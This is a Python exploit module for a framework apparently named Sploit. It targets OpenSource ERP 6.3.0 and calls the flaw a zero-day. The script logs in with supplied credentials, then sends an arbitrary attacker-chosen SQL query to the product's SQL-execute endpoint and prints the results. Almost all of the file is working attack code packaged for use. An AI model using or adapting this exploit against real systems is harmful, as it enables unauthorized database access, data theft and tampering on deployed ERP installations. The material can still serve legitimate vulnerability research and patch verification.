#!/usr/bin/env python
import xml.etree.ElementTree as ET
import urllib2
import cookielib
from collections import OrderedDict


from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efa_open_source_erp_arbitrary_sql_executuion"
INFO['DESCRIPTION'] = "OpenSource ERP Arbitrary SQL query execution"
INFO['VENDOR'] = "http://www.nelson-it.ch/"
INFO["CVE Name"] = "0day"
INFO["DOWNLOAD_LINK"] = "http://www.nelson-it.ch/download/"
INFO["LINKS"] = []
INFO['CHANGELOG'] = "4 Jun, 2018"
INFO['PATH'] = "WEB/"
INFO["NOTES"] = """
    Remote attacker can execute arbitrary SQL query. Authentication is required.
Tested against OpenSource ERP 6.3.0 on Windows 7 x64 SP1.
"""

# Must be in every module, to be set by framework
OPTIONS = OrderedDict()
OPTIONS["HOST"] = "192.168.1.103"
OPTIONS["PORT"] = 8024
OPTIONS["USERNAME"] = 'test'
OPTIONS["PASSWORD"] = 'test'
OPTIONS["QUERY"] = 'SELECT version();'


class exploit(Sploit):
    def __init__(self,host="",
                port=0, ssl=False,
                logger=None):
        Sploit.__init__(self, logger=logger)
        self.payload = ""

    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get("HOST", OPTIONS["HOST"])
        self.port = self.args.get("PORT", OPTIONS["PORT"])
        self.username = self.args.get("USERNAME", OPTIONS["USERNAME"])
        self.password = self.args.get("PASSWORD", OPTIONS["PASSWORD"])
        self.query = self.args.get("QUERY", OPTIONS["QUERY"])

    def make_url(self, path=''):
        url = 'http://{}:{}/'.format(self.host, self.port) + path
        return url

    def login(self):
        cookie = cookielib.CookieJar()
        opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cookie))
        url = self.make_url('dbadmin')
        data = 'mneuserloginname=%s&mneuserpasswd=%s' % (self.username, self.password)
        try:
            res = opener.open(url, data).read()
        except Exception as e:
            pass
        self.opener = opener

    def run(self):
        # Get options from gui
        self.args()
        self.login()
        url = self.make_url('db/utils/connect/sql/execute.xml')
        self.log('[+] Trying to execute query: "%s"' % self.query)
        data = 'command=%s' % self.query
        res = self.opener.open(url, data).read()
        root = ET.fromstring(res)
        self.log(' | '.join(el.text for el in root.findall('body')[0][0]))
        self.finish(True)


if __name__ == '__main__':
    """
    By now we only have the tool
    mode for exploit..
    Later we would have
    standalone mode also.
    """
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1",80)
    e.run()